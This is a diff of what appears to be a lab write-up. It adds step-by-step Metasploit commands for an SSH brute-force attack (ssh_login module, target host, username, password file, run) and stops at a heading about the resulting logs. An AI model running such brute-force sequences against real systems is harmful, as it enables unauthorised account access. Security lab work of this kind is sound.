@@ -97,7 +97,7 @@ To start my attack, I started **Metasploit** on my attack VM:
 msfconsole
 ```
 
-Once **Metasploit** has loaded (you will see `msf6 >`), I select the SSH brute-force module:
+Once **Metasploit** has loaded (you will see `msf6 >`), I selected the SSH brute-force module:
 ```
 msf6 > use auxiliary/scanner/ssh/ssh_login
 ```
@@ -119,10 +119,29 @@ msf6 > auxiliary(scanner/ssh/ssh_login) > set RHOSTS x.x.x.x
 msf6 > auxiliary(scanner/ssh/ssh_login) > set USERNAME xxxxx
 ```
 
-- Set the password list to use (PASS_LIST):
+- Set the password list (PASS_LIST):
 ```
-msf6 > auxiliary(scanner/ssh/ssh_login) >
+msf6 > auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/attackVM/passwords.txt
 ```
+
+- Set `STOP_ON_SUCCESS` to stop running when the correct password is found:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
+```
+
+- If you want to see all attempts printed out, you can set `VERBOSE` mode to `True`:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
+```
+
+Once all options have been set, run the Bruteforce attack:
+```
+msf6 > auxiliary(scanner/ssh/ssh_login) > run
+```
+
+-----
+
+### What the logs showed:
 
 
 
